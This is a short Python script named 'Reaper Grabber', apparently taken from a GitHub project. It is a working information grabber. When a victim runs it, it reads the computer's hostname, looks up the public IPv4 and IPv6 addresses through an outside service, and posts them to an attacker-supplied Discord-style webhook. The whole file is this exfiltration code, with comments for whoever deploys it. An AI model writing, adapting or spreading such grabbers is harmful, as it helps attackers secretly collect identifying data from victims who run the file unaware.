import requests
import socket

#! Made by https://github.com/nullylol/Reaper-Grabber

webhook = "webhook_here" #!  Webhook goes here

def Collect():

    pcname = socket.gethostname() #! Grabs PC Name

    r = requests.get('https://ipv4bot.whatismyipaddress.com').text #! Visits IPV4 Website
    g = requests.get('https://ipv6bot.whatismyipaddress.com').text #! Visits IPV6 Website

    payloads = {
        "content" : f"```asciidoc\nGrabbed With Reaper Grabber.\nIP Report for :: {pcname}\nIPV4 :: {r}\nIPv6 :: {g}```", #! Don't touch anything here tbh
        "username" : "Reaper Grabber", #! Username for webhook
        "avatar_url" : "https://upload.wikimedia.org/wikipedia/commons/6/6a/Reaper.png", #! Profile Picture For Webhook (eg. https://www.ascii.wtf/ascii.png)
    }

    requests.post(webhook, data=payloads) #! Sends information (content) to the webhook

    quit() #! Quits the program
   
Collect() #! Starts the function